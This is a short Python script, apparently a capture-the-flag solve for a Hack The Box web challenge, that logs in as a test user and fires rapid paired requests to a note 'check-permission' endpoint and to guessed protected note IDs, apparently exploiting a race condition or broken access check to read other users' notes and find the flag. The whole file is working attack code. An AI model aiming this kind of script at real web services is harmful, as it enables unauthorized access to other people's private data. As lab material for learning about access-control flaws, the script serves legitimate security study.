#!/usr/bin/env python3
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

BASE_URL = "http://83.136.255.203:47148"

# Use original test user
r = requests.post(f"{BASE_URL}/api/auth/login", 
                 json={"email": "test@test.com", "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_notes = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes']
print(f"[*] User: test@test.com")
print(f"[*] My notes: {[n['id'] for n in my_notes[:3]]}")

my_note = my_notes[0]['id']

# Try ALL my notes as check-permission sources
for source_note in my_notes[:3]:
    print(f"\n[*] Using source note: {source_note['id'][:20]}...")
    
    # Protected IDs to try
    protected_ids = ["administrator", "htb", "hidden", "d3vnu11", "FLAG"]
    
    for target_id in protected_ids:
        def try_exploit():
            requests.get(f"{BASE_URL}/api/notes/{source_note['id']}/check-permission", headers=headers)
            r = requests.get(f"{BASE_URL}/api/notes/{target_id}", headers=headers)
            return r.json()
        
        # Try 100 times very fast
        for i in range(100):
            result = try_exploit()
            if result.get('success'):
                note = result.get('note', {})
                content = note.get('content', '')
                
                if 'HTB{' in content:
                    print(f"\n[!!!!!!] FLAG FOUND in {target_id}:")
                    print(f"  Content: {content}")
                    exit(0)
                elif content != 'test':
                    print(f"  [+] Got {target_id}: {content}")

print("\n[*] No flag found")
